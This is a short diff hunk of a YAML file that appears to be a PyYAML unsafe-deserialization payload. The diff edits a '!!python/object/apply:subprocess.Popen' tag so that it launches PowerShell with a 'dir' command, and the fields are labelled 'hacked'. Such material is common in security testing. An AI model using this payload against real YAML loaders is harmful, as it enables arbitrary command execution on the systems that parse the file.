@@ -3,7 +3,7 @@
 # listitems: !!str '!!python/object/apply:subprocess.Popen [["powershell", "-Command", "dir"]]'
 
 - !!python/object/new:yaml.MappingNode
-  listitems: !!str '!!python/object/apply:subprocess.Popen [["python", "-Command", "dir"]]'
+  listitems: !!str '!!python/object/apply:subprocess.Popen [["PowerShell", "-Command", "dir"]]'
   state:
     tag: !!str hacked
     value: !!str hacked
